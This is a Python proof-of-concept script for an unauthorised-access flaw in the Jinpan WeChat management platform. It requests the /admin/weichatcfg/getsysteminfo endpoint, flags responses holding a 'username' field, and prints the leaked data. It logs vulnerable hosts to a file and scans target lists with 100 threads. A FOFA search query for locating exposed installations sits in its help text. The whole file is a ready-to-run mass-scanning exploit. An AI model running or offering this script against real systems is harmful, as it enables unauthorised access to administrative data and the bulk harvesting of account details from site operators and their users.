#-*- coding: utf-8 -*-
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
       _ _       _____            
      | (_)     |  __ \           
      | |_ _ __ | |__) |_ _ _ __  
  _   | | | '_ \|  ___/ _` | '_ \ 
 | |__| | | | | | |  | (_| | | | |
  \____/|_|_| |_|_|   \__,_|_| |_|
                                           tag :  金盘微信管理平台 getsysteminfo 未授权访问漏洞 poc
                                                                             @author : Gui1de
    """
    print(test)



headers = {
    "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "If-Modified-Since": "Tue, 24 Nov 2020 08:18:08 GMT", "Connection": "close"
}

def poc(target):
    url = "http://"+target+"/admin/weichatcfg/getsysteminfo"
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5).text
        if '"username"' in res and "<!DOCTYPE html>" not in res and "<!DOCTYPE HTML>" not in res:
            print(f"[+] {target} is vulable\n{res}\n")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} is not vulable")
    except:
        print(f"[*] {target} 请求失败")

def main():
    banner()
    parser = argparse.ArgumentParser(description='金盘微信管理平台未授权访问漏洞 fofa:title="微信管理后台" && icon_hash="116323821"')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: www.example.com ")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()